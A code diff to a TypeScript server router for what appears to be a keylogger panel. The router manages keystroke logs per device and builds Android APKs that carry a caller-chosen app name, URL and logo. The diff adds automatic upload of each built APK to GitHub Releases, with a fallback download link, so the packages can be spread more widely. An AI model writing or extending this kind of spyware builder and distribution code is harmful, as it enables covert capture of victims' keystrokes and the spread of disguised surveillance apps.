@@ -8,9 +8,10 @@ import { getSessionCookieOptions } from "./_core/cookies";
 import { COOKIE_NAME } from "../shared/const";
 import { systemRouter } from "./_core/systemRouter";
 import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
-import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser, createAPKBuild, getAPKBuildsByUser, updateAPKBuildStatus, updateAPKBuildFileSize } from './db';
+import { getKeylogsByDevice, deleteKeylog, restoreKeylog, getAlerts, getEvents, saveSettings, getSettings, getDeletedKeylogs, registerDevice, getDevicesByUser, createAPKBuild, getAPKBuildsByUser, updateAPKBuildStatus, updateAPKBuildFileSize, updateAPKBuildGitHubUrl } from './db';
 import { sdk } from "./_core/sdk";
 import { generateRealAPK } from "./apk-generator";
+import { uploadToGitHubRelease, generateReleaseName, generateReleaseTag, generateReleaseBody } from "./github-releases";
 
 export const appRouter = router({
     // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
@@ -265,6 +266,30 @@ export const appRouter = router({
               // Atualizar fileSize
               const fileSize = fs.statSync(apkPath).size;
               await updateAPKBuildFileSize(build.id, fileSize);
+              
+              // Tentar fazer upload para GitHub Releases
+              let downloadUrl = `https://remotemon-vhmaxpe6.manus.space/apks/${filename}`;
+              if (process.env.GITHUB_TOKEN && process.env.GITHUB_REPO_URL) {
+                try {
+                  const repoMatch = process.env.GITHUB_REPO_URL.match(/github\.com\/([^\/]+)\/([^\/]+)/);
+                  if (repoMatch) {
+                    const [, owner, repo] = repoMatch;
+                    const githubUrl = await uploadToGitHubRelease(apkPath, {
+                      owner,
+                      repo,
+                      token: process.env.GITHUB_TOKEN,
+                      tagName: generateReleaseTag(),
+                      releaseName: generateReleaseName(),
+                      releaseBody: generateReleaseBody(input.appName, input.appUrl, input.logoUrl),
+                    });
+                    await updateAPKBuildGitHubUrl(build.id, githubUrl);
+                    console.log(`[APK] APK enviado para GitHub Releases: ${githubUrl}`);
+                  }
+                } catch (error) {
+                  console.warn('[APK] Aviso ao fazer upload para GitHub Releases:', error);
+                  // Continuar com download local se GitHub falhar
+                }
+              }
               
               await updateAPKBuildStatus(build.id, 'success');
               console.log(`[APK] Build concluído: ${filename} (${(fileSize / 1024 / 1024).toFixed(2)}MB)`);
